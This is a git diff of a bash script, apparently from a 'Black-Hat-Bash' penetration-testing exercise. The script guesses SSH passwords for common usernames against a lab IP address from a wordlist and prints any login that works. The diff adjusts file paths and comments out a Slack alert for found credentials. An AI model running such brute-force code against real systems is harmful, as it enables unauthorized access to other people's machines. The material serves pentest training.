@@ -1,6 +1,6 @@
 #!/bin/bash
 
-source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"
+source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"
 
 # Define the target SSH server and port
 TARGET="172.16.10.13"
@@ -8,7 +8,7 @@ PORT="22"
 
 # Define the username and password lists
 USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
-PASSWORD_FILE="passwords.txt"
+PASSWORD_FILE="ch07/common-credentials/passwords.txt"
 #PASSWORD_FILE="/usr/share/wordlists/wifite.txt"
 
 echo "Starting SSH credential testing..."
@@ -26,7 +26,7 @@ for user in "${USERNAMES[@]}"; do
       echo "Username: ${user}"
       echo "Password: ${pass}"
 
-      notify_slack "Successful $TARGET:$PORT SSH login: $user/$pass"
+#      notify_slack "Successful $TARGET:$PORT SSH login: $user/$pass"
 
       # Perform additional actions here using the credentials
       exit 0
